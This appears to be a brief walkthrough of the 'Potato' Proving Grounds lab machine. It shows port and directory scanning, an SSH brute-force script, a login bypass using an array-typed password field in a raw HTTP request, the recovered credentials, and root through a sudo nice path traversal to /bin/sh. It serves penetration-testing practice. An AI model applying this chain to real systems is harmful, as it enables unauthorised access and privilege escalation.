参考教程  
[https://medium.com/@dumbangrydog/pg-play-potato-linux-cb577ddd0df9](https://medium.com/@dumbangrydog/pg-play-potato-linux-cb577ddd0df9)
 
[http://192.168.212.101/](http://192.168.212.101/)
 
sudo nmap -p- -Pn -v -sS -A -T4 192.168.212.101
 
gobuster dir -u [http://192.168.212.101/](http://192.168.212.101/) -w /usr/share/dirb/wordlists/raft-medium-directories.txt
   

dizhi  
[http://192.168.212.101/admin/index.php](http://192.168.212.101/admin/index.php)
 
nmap -p22 --script=/usr/share/nmap/scripts/ssh-brute.nse 192.168.212.101
   

shujubao  
POST /admin/index.php?login=1 HTTP/1.1  
Host: 192.168.212.101  
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate, br  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 32  
Origin: [http://192.168.212.101](http://192.168.212.101)  
Connection: keep-alive  
Referer: [http://192.168.212.101/admin/index.php](http://192.168.212.101/admin/index.php)  
Upgrade-Insecure-Requests: 1  
Priority: u=0, i
 
username=admin&password[]=''
   

webadmin:dragon
 
webadmin@serv:~$ cat local.txt  
a33b27ea57cebe0e2cf5c64ea769297b  
webadmin@serv:~$
 
webadmin@serv:~$ ls  
local.txt user.txt  
webadmin@serv:~$ cat local.txt  
a33b27ea57cebe0e2cf5c64ea769297b  
webadmin@serv:~$ sudo -l  
[sudo] password for webadmin:  
Matching Defaults entries for webadmin on serv:  
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
User webadmin may run the following commands on serv:  
(ALL : ALL) /bin/nice /notes/*  
webadmin@serv:~$ sudo /bin/nice /notes/../../../../bin/sh  
# id  
uid=0(root) gid=0(root) groups=0(root)  
# cd /root  
# ls  
proof.txt root.txt snap  
# cat proof.txt  
7e0dccda69ed9cce9e414743fb25d41d  
#